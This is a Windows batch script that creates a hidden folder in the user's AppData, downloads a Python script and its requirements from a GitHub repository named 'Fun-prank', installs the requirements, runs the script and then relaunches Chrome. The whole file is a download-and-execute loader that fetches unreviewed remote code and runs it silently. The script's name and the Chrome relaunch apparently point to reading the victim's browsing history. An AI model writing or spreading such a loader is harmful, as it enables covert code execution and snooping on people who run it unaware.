@echo off
echo Starting process...

:: Create the history directory if it doesn't exist
set HISTORY_DIR=%APPDATA%\history
echo %DATE% %TIME% - Creating history directory if it doesn't exist... >> %HISTORY_DIR%\install_log.txt
if not exist "%HISTORY_DIR%" mkdir "%HISTORY_DIR%"

:: Log the creation of the history folder
echo %DATE% %TIME% - History directory created: %HISTORY_DIR% >> %HISTORY_DIR%\install_log.txt

:: Download the history_report.py script
echo %DATE% %TIME% - Downloading history_report.py... >> %HISTORY_DIR%\install_log.txt
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/main/history_report.py' -OutFile '%HISTORY_DIR%\history_report.py'"

:: Check if the file exists after downloading
if exist "%HISTORY_DIR%\history_report.py" (
    echo %DATE% %TIME% - File downloaded successfully. >> %HISTORY_DIR%\install_log.txt
) else (
    echo %DATE% %TIME% - Failed to download history_report.py. Exiting... >> %HISTORY_DIR%\install_log.txt
    pause
    exit /b
)

:: Download the requirements.txt file
echo %DATE% %TIME% - Downloading requirements.txt... >> %HISTORY_DIR%\install_log.txt
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/main/requirements.txt' -OutFile '%HISTORY_DIR%\requirements.txt'"

:: Check if the requirements.txt file exists
if exist "%HISTORY_DIR%\requirements.txt" (
    echo %DATE% %TIME% - Requirements file downloaded successfully. >> %HISTORY_DIR%\install_log.txt
) else (
    echo %DATE% %TIME% - Failed to download requirements.txt. Exiting... >> %HISTORY_DIR%\install_log.txt
    pause
    exit /b
)

:: Install required Python libraries
echo %DATE% %TIME% - Installing required libraries... >> %HISTORY_DIR%\install_log.txt
pip install -r "%HISTORY_DIR%\requirements.txt"

:: Check if pip installation was successful
if %ERRORLEVEL% NEQ 0 (
    echo %DATE% %TIME% - Failed to install required libraries. Exiting... >> %HISTORY_DIR%\install_log.txt
    pause
    exit /b
)

:: Run the Python script
echo %DATE% %TIME% - Running the Python script... >> %HISTORY_DIR%\install_log.txt
python "%HISTORY_DIR%\history_report.py"

:: Check if the script ran successfully
if %ERRORLEVEL% NEQ 0 (
    echo %DATE% %TIME% - Failed to run the Python script. Exiting... >> %HISTORY_DIR%\install_log.txt
    pause
    exit /b
)

:: Wait for 3 seconds
echo %DATE% %TIME% - Waiting for 3 seconds... >> %HISTORY_DIR%\install_log.txt
timeout /t 3

:: Reopen Google Chrome
echo %DATE% %TIME% - Reopening Google Chrome... >> %HISTORY_DIR%\install_log.txt
start chrome

:: Log completion and pause
echo %DATE% %TIME% - Process completed. >> %HISTORY_DIR%\install_log.txt
pause
